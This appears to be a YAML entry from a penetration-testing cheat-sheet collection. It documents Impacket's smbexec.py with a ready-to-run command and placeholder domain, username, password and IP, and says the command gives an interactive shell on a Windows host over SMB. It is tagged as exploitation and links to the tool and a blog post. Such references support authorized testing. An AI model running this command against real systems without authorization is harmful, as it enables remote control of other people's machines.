---
description: |
  Impacket's smbexec.py. Cela vous donnera un shell interactif sur l'hôte Windows.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Password: password123
command: |
  python3 smbexec.py test.local/john:password123@10.10.10.1
items:
  - Password
  - Username
services:
  - SMB
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py
  - https://www.varonis.com/blog/insider-danger-stealthy-password-hacking-with-smbexec/
---
